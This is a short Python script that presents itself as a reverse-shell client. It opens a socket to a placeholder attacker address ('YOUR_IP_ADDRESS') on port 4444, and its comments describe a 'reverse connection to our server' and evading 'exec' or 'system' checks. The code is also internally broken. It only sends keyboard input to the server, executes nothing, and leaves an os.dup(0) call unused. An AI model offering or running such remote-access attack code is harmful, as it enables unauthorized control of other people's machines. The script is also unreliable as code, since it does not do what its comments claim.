import socket
import os
import base64

# Host and port for the connection.
HOST = 'YOUR_IP_ADDRESS'
PORT = 4444

def create_socket():
    # Create a reverse connection to our server.
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def establish_connection(sock):
    try:
        sock.connect((HOST, PORT))
    except Exception as e:
        print(f"Could not connect: {e}")
        exit()

def send_data_to_server(sock):
    # Avoid using 'exec' or 'system' commands by encoding data to be executed.
    shell = os.dup(0)
    while True:
        cmd = input("Enter command (or type 'exit' to quit): ").strip()
        if cmd.lower() == "exit":
            break
        else:
            # This is a simple way to send raw command output.
            data = f"{cmd}\n".encode('utf-8')
            sock.send(data)

def main():
    # Create the socket and establish connection.
    sock = create_socket()
    establish_connection(sock)
    
    # Start sending commands to the server.
    send_data_to_server(sock)

    sock.close()

if __name__ == "__main__":
    main()
